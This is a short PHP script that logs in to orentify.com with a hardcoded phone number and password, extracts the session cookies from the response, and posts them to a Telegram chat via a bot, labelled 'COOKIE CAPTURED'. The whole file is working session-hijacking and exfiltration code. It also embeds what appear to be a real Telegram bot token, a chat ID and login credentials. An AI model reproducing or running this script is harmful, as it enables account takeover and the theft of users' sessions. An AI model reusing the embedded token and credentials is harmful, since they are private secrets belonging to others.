<?php
$phone = '09051547147';  // Replace with actual phone input
$password = '282200123';  // Replace with actual password input
$bot_token = '8150448089:AAHW5f-jFO6rkcJtY_5m6ixs25mAG-ie6FY';  // Replace with your Telegram bot token
$chat_id = '6156753911';  // Replace with your Telegram chat ID

// Initialize a single cURL session
$ch = curl_init();

// Step 1: Login request to orentify.com
curl_setopt($ch, CURLOPT_URL, 'https://orentify.com/middleMan/login.php');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'phone' => $phone,
    'password' => $password
]));
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Referer: https://orentify.com',
    'Origin: https://orentify.com',
    'Host: orentify.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the login request
$response = curl_exec($ch);

// Separate headers and body from response
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$headers = substr($response, 0, $header_size);
$body = substr($response, $header_size);

// Extract cookies from headers
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $headers, $matches);
$cookies = array();
foreach ($matches[1] as $item) {
    parse_str($item, $cookie);
    $cookies = array_merge($cookies, $cookie);
}

// Prepare cookie data for sending to Telegram
$cookie_data = '';
if (!empty($cookies)) {
    foreach ($cookies as $name => $value) {
        $cookie_data .= "$name=$value; ";
    }
} else {
    $cookie_data = 'No cookies were set by the server.';
}

// Step 2: Prepare the message to send to Telegram
$message = "------[ COOKIE CAPTURED ]------\n";
$message .= "Cookies: $cookie_data\n";
$message .= "Date of Access: " . date('Y-m-d H:i:s') . "\n";
$message .= "------[ END OF COOKIE CAPTURE ]------";

// Step 3: Send the cookie data to Telegram via the Bot API
$telegram_api_url = "https://api.telegram.org/bot$bot_token/sendMessage";
$post_fields = [
    'chat_id' => $chat_id,
    'text' => $message
];

// Reuse the same cURL session for Telegram API request
curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
curl_setopt($ch, CURLOPT_HTTPHEADER, array());  // Reset HTTP headers
curl_setopt($ch, CURLOPT_HEADER, false);  // Disable header capture for Telegram API call

// Execute the Telegram API request
$telegram_response = curl_exec($ch);

// Close the cURL session
curl_close($ch);

// Optional: Check the response from Telegram API
if ($telegram_response) {
    echo "Cookie data sent successfully to Telegram.";
} else {
    echo "Failed to send cookie data to Telegram.";
}

// Output the response body (content) for debugging purposes
echo $body;
?>
